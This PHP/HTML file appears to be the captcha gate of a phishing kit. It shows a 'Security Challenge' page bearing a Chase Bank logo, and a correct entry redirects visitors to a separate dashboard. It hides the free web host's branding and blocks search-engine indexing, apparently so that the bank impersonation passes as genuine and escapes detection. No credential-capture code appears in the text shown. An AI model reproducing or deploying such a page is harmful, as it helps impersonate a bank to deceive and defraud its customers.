<?php
session_start();

if ( isset($_POST['captcha']) && ($_POST['captcha']!="") ){
// Validation: Checking entered captcha code with the generated captcha code
    if(strcasecmp($_SESSION['captcha'], $_POST['captcha']) == 0){
// Note: the captcha code is compared case insensitively.
// if you want case sensitive match, check above with strcmp()
    $_SESSION['ValidCaptcha'] = 'valid';
    header('Location: dashboard/index.php');
    }
}

?>
<!DOCTYPE html>
<html class="no-js" lang="">
<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <title>Please Enter Security Challenge</title>
    <meta name="robots" content="noindex, nofollow, noimageindex">
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1">


  
    <link rel="stylesheet" href="./dashboard/index_files/styles.css" type="text/css" media="all">


    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <link rel="stylesheet" href="assets/css/cap.css">
</head>
<body class="home" >
<input type="hidden" id="link" value="">

<!--<div class="loading text-center" id="loading"></div>-->

<div class="homWrapper">

            <div class="col-auto">
                <div class="captcha-wrapper">
                    <div class="logo"></div>
                    <div class="form">
                      <div class="logo">
                        <div align="center"></div>
                      </div>
                      <h2><img src="assets/img/263-2636562_chase-bank-logo-chase-bank-logo-png.png" width="301" height="82">Security Challenge</h2>
                        <p>Type the characters you see in the image for security purposes.</p>
<!--                        <div id="captcha" data-cap="--><?//= $captcha_string?><!--"></div>-->
                        <img src="dashboard/captcha.php?rand=<?php echo rand(); ?>" id='captcha_image'>

                      <form action="" method="post">
                        <p>
                          <input type="text"  placeholder="Captcha code" class="input" name="captcha">
                        </p>
<button type="submit" class="btn btn--primary btn--block">Continue</button>
<p>&nbsp;</p>
<p><img src="assets/img/ssl.png" width="126" height="28"></p>
                        </form>

                  </div>
                </div>
            </div>
        </div>

<!-- End  Wrapper -->


<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
<script src="assets/js/bundle.js"></script>
<script src="assets/js/loader.js"></script>
<!--<script>-->
<!--    var canv = document.createElement("canvas");-->
<!--    canv.id = "captcha";-->
<!--    canv.width = 100;-->
<!--    canv.height = 50;-->
<!--    var ctx = canv.getContext("2d"),-->
<!--        captcha = document.getElementById('captcha');-->
<!--    ctx.font = "25px Georgia";-->
<!--    ctx.strokeText(captcha.dataset.cap, 0, 30);-->
<!--    //storing captcha so that can validate you can save it somewhere else according to your specific requirements-->
<!--    // code = captcha.join("");-->
<!--    captcha.appendChild(canv); // adds-->
<!--</script>-->
<style>
   img[src*="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"] {
    display: none;}
</style>
</body>
</html>